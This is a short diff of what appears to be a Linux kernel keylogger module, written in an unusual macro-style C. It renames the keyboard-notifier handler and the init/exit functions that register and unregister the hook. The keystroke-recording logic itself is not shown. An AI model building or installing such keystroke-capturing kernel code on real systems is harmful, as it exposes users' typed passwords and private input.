@@ -52,7 +52,7 @@
     static FUNCTION( myHandleMedium OF (DECLARE(nblock AS notifier_block*), DECLARE(action AS unsigned long), DECLARE(data AS keyboard_notifier_param*)) AS int );
     
     notifier_block nb = {
-        .notifier_call = handleMedium,
+        .notifier_call = myHandleMedium,
     };
     
     static FUNCTION( myHandleMedium OF (
@@ -71,21 +71,21 @@
         return NOTIFY_OK;
     ENDFUNCTION
     
-    static __init FUNCTION( myInit OF () AS int ) 
+    static FUNCTION( __init myInit OF () AS int ) 
     STARTFUNCTION
         printk(KERN_INFO "Starting\n");
         register_keyboard_notifier(&nb);
         return 0;
     ENDFUNCTION
     
-    static __exit FUNCTION( myExit OF () AS void ) 
+    static FUNCTION( __exit myExit OF () AS void ) 
     STARTFUNCTION
         printk(KERN_INFO "\nEnding\n");
         unregister_keyboard_notifier(&nb);
     ENDFUNCTION
     
-    module_init(keylogger_init);
-    module_exit(keylogger_exit);
+    module_init(myInit);
+    module_exit(myExit);
     
     
     
